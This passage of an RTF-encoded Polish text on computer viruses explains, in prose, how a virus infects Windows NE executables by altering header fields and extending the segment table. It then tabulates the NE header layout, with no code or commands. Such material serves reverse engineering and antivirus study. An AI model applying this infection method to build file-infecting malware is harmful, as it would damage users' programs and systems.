\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}MP}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Stare pliki PharLap (pliki *.EXP)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}P2}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}PharLap 286 (pliki *.EXP)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}P3}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}PharLap 386 (pliki *.EXP)}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.2.2.1. Pliki EXE dla Windows (NE)}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W przypadku program\'f3w dla Windows (znacznik NE) infekcja plik\'f3w polega\uc1\u263\'e6 mo\uc1\u380\'bfe na odpowiedniej modyfikacji p\'f3l nag\uc1\u322\'b3\'f3wka NE oraz dodatkowo tablicy segment\'f3w zawartych w programie, kt\'f3r\uc1\u261\'b9 trzeba rozszerzy\uc1\u263\'e6 o segment identyfikuj\uc1\u261\'b9cy miejsce w pliku, w kt\'f3rym znajduje si\uc1\u281\'ea kod wirusa. Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf rozszerzenie tablicy segment\'f3w wi\uc1\u261\'b9\uc1\u380\'bfe si\uc1\u281\'ea z konieczno\uc1\u347\'9cci\uc1\u261\'b9 przesuni\uc1\u281\'eacia ca\uc1\u322\'b3ego nast\uc1\u281\'eapuj\uc1\u261\'b9cego po niej kodu programu (najcz\uc1\u281\'ea\uc1\u347\'9cciej bardzo d\uc1\u322\'b3ugiego), ja}{\f1\fs24\lang1045{\*\listtag0}k}{\f0\fs24\lang1045{\*\listtag0}o jedno z rozwi\uc1\u261\'b9za\uc1\u324\'f1 proponuje si\uc1\u281\'ea zmniejszenie rozmiaru programu STUB i przesuni\uc1\u281\'eacie tylko pocz\uc1\u261\'b9tkowej cz\uc1\u281\'ea\uc1\u347\'9cci pliku (w tym wypadku cofni\uc1\u281\'eacie cz\uc1\u281\'ea\uc1\u347\'9cci nag\uc1\u322\'b3\'f3wka) w tak wygospodarowane miejsce.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Format nag\uc1\u322\'b3\'f3wka pliku nowy EXE (NE) dla Windows pokazano poni\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format nag\uc1\u322\'b3\'f3wka plik\'f3w nowy EXE (NE) dla Windows}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.6189in/5.9696in/; table-sdh:8923508}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}znacznik pliku, bajty 'NE'}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}numer wersji programu linkuj\uc1\u261\'b9cego (najpierw bardziej znacz\uc1\u261\'b9ca, potem mniej znacz\uc1\u261\'b9ca cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04-05}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}offset wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka do tablicy wej\uc1\u347\'9c\uc1\u263\'e6; format tablicy wej\uc1\u347\'9c\uc1\u263\'e6 jest nast\uc1\u281\'eapuj\uc1\u261\'b9cy 00 liczba wej\uc1\u347\'9c\uc1\u263\'e6 (00, je\uc1\u380\'bfeli koniec listy)}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    01 numer segmentu (00, je\uc1\u380\'bfeli koniec listy)}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    02 pierwszy rekord }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    05 drugi rekord}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .........}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ka\uc1\u380\'bfdy rekord ma format }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00   flagi:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        bit 0: EXPORTED}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        bit 1: SINGLE DATA}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        bity 2-7: nie u\uc1\u380\'bfywane }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01-02 ofset w segmencie }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06-07}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 (w bajtach) tablicy wej\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08-0B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}kod korekcyjny (CRC) pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0C}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}flagi programu; znaczenie poszczeg\'f3lnych bit\'f3w}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0-1 DGROUP }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    0 = nie ma}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1 = SINGLE SHARED}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    2 = MULTIPLE (UNSHARED)}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    3 = (NULL)}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2 bit globalnej inicjalizacji}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3 program tylko dla trybu chronionego}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4 program zawiera instrukcje 8086}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5 program zawiera instrukcje 80286}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6 program zawiera instrukcje 80386}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7 program zawiera instrukcje 80x87}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}flagi aplikacji; znaczenie poszczeg\'f3lnych bit\'f3w:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0-2 typ aplikacji}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    001 pe\uc1\u322\'b3noekranowa (bez Windows AP! dla trybu chronionego)}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    010 kompatybilna z Windows API dla trybu chronionego}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    011 u\uc1\u380\'bfywa Windows API dla trybu chronionego 3 aplikacja przeznaczona }{\f1\fs24\lang1045{\*\listtag0}dla OS/2}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5 0=wykonywalna, 1=b\uc1\u322\'b3\uc1\u281\'eady w obrazie pliku}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6 niezgodny typ programu (stos nie jest zachowywany)}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7 plik DLL lub sterownik}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (SS:SP: z\uc1\u322\'b3e warto\uc1\u347\'9cci, CS:IP wskazuje na procedur\uc1\u281\'ea incjalizacji typu FAR, wywo\uc1\u322\'b3ywan\uc1\u261\'b9 z AX=uchwyt do modu\uc1\u322\'b3u, zwracaj\uc1\u261\'b9ca AX=0 b\uc1\u322\'b3\uc1\u261\'b9d }{\f1\fs24\lang1045{\*\listtag0}lub AX<>0 poprawna inicjalizacja)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0E-0F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}indeks do segmentu danych typu AUTODATA 10-11     inicjalny rozmiar sterty lokalnej}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}12-13}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}inicjalny rozmiar stosu, dodany do segmentu danych lub 0000h, gdy DS=SS}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}14-17}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}wej\uc1\u347\'9ccie do programu (CS:IP), CS oznacza indek}{\f1\fs24\lang1045{\*\listtag0}s w tablicy segment\'f3w}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18-1B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}daleki wska\uc1\u378\'9fnik na stos programu (SS:SP), SS oznacza indeks w tablicy segment\'f3w; je\uc1\u380\'bfeli SS jest typu autodata i SP=OOOOh, wska\uc1\u378\'9fnik stosu ustawiany jest na ko\uc1\u324\'f1cu segmentu danych typu AUTODATA, pod stert\uc1\u261\'b9 lokaln\uc1\u261\'b9}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1C-1D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}ilo\uc1\u347\'9c\uc1\u263\'e6 segment\'f3w 1 E-1 F    ilo\uc1\u347\'9c\uc1\u263\'e6 odwo\uc1\u322\'b3a\uc1\u324\'f1 do modu\uc1\u322\'b3\'f3w}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}20-21}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 (w bajtach) nierezydentnej tablicy nazw}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}22-23}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}offset wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka do tablicy segment\'f3w, sk\uc1\u322\'b3adaj\uc1\u261\'b9cej si\uc1\u281\'ea z rekord\'f3w o formacie (pierwszy rekord ma numer 1):}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00-01 ofset w pliku (tr}{\f0\fs24\lang1045{\*\listtag0}zeba przesun\uc1\u261\'b9\uc1\u263\'e6 o warto\uc1\u347\'9c\uc1\u263\'e6 z pola 32-3}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch nag\uc1\u322\'b3\'f3wka, aby uzyska\uc1\u263\'e6 adres w bajtach) }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 02-03 d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 obrazu pliku (0000h=64K) }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 04-05 atrybuty segmentu }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    0 segment danych}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1 nie u\uc1\u380\'bfywane}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    2 REALMODE}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    3 ITERATED}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    4 MOVABLE}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    5 SHARABLE}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    6 PRELOADED}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    7 EXECUTE-CODE (kod) lub READ-ONLY (dane)}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    8 relokacje (bezpo\uc1\u347\'9crednio po kodzie w segmencie)}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    9 istniej\uc1\u261\'b9 informacje dla debuggera }{\f0\fs24\lang1045{\*\listtag0}\par}
